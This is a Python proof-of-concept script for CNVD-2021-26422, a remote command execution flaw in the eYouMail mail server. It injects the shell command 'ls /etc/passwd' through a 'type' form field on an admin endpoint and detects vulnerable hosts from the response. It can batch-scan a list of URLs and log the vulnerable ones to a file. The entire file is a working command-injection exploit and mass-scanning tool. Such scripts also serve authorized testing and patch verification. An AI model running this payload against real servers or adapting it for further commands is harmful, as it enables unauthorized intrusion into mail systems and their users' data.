#!/usr/bin/python
# Env: python3
# Author: afei00123
# -*- coding: utf8 -*-

import requests, urllib3, time, re, argparse
from colorama import init
init(autoreset=True)

def title():
    print("")
    print('*'.center(60, '*'))
    print("Version：eYouMail V8.3-V8.13的部分二次开发版本".center(30))
    print("github：https://github.com/ltfafei".center(50))
    print("gitee：https://gitee.com/afei00123".center(50))
    print("CSDN: afei00123.blog.csdn.net".center(50))
    print("公众号：网络运维渗透".center(50))
    print("")
    print('*'.center(60, '*'))
    print("")

class eYouMail_RCE_POC():
    def eYouMail_RCE_Check(self, url):
        target_url = f"{url}//webadm/?q=moni_detail.do&action=gragh"
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
            "accept": "*/*",
            "Cache-Control": "max-age=0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip, deflate",
            "Upgrade-Insecure-Requests": "1"
        }
        payload = '''type="|ls /etc/passwd||"'''
        try:
            data = requests.post(target_url, headers=headers, data=payload, timeout=3).text
            try:
                res = re.search(r"/etc/passwd", data).group()
                if res == "/etc/passwd":
                    print(f"\033[31m[+] {url}存在远程命令执行漏洞！")
                    with open("eYouMail_vuln.txt", "a+") as f:
                        f.writelines(url + "\n")
            except AttributeError:
                print(f"[n] {url}不存在该漏洞。")
                return url
            except Exception as e:
                print(f"[n] {url}不存在该漏洞。", e)
                return url
        except Exception as e:
            print(f"[n] {url}请求失败！")
            return url

    def eYouMail_Batch_Check_POC(self, url, file):
        if url:
            return True
        elif file:
            for url in file:
                url = url.replace('\n', '')
                time.sleep(3)
                self.eYouMail_RCE_Check(url)

if(__name__ == "__main__"):
    title()
    parser = argparse.ArgumentParser(description="CNVD-2021-26422_eYouMail_RCE POC")
    parser.add_argument(
        '-u', '--url', type=str,
        help='Please input target url. eg: https://ip:port'
    )
    parser.add_argument(
        '-f', '--file', type=argparse.FileType('r'),
        help='Please input urls file path. eg: c:\\urls.txt'
    )
    args = parser.parse_args()
    run_POC = eYouMail_RCE_POC()
    if args.file:
        run_POC.eYouMail_Batch_Check_POC(args.url, args.file)
        print("\n[done] 批量探测完成，请查看：eYouMail_vuln.txt")
    if args.url:
        run_POC.eYouMail_RCE_Check(args.url)